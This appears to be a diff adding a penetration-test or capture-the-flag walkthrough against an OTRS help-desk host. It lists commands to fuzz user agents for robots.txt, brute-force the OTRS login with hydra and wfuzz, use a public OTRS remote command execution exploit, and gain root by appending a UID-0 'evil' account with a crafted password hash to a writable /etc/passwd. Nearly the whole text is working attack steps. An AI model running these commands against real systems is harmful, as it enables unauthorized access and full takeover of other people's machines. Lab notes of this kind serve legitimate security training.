@@ -1,0 +1,38 @@
+# 1 robots.txt has been found but wasn't able to access it
+robots.txt
+
+# 2 obtain usable user agent to access robots.txt
+wfuzz -c -w /usr/share/wordlists/SecLists/Fuzzing/User-Agents/UserAgents.fuzz.txt -H "User-Agent: FUZZ"  "http://$IP/robots.txt"
+
+# 3 access robots.txt by curl with a usable user agent
+curl -A "Bitacle bot/1.1" http://$IP/robots.txt
+User-agent: *
+Allow: /otrs/index.pl
+
+# 4 brute force login
+cewl http://$IP/otrs/index.pl > wordlist.txt
+hydra $IP http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-600&User=^USER^&Password=^PASS^:F=Login failed" -l root@localhost -P wordlist.txt -vV -f -I
+wfuzz -u http://$IP/otrs/index.pl -d "Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=root@localhost&Password=FUZZ" -w wordlist.txt --hh 18158  -c 
+
+# 5 found public exploit
+OTRS 5.0.x/6.0.x - Remote Command Execution (1) | perl/webapps/43853.txt
+
+# 6 follow exploit document to get a low-level shell
+
+# 7 found writable file
+/etc/passwd
+
+# 8 Generating a new User Hash
+openssl passwd -1 -salt salt password
+$1$salt$qJH7.N4xYta3aEG/dfqo/0
+
+OR
+
+python3 -c 'import crypt; print(crypt.crypt("password", "$6$salt"))'
+$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTS4XMS130MTSuDDl3aCI6WouIL9AjRbLCelDCy.g.
+
+# 9 Add evil user (remember to escape the '$' sign with '\')
+echo "evil:\$1\$salt\$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+# 10 be root
+su evil
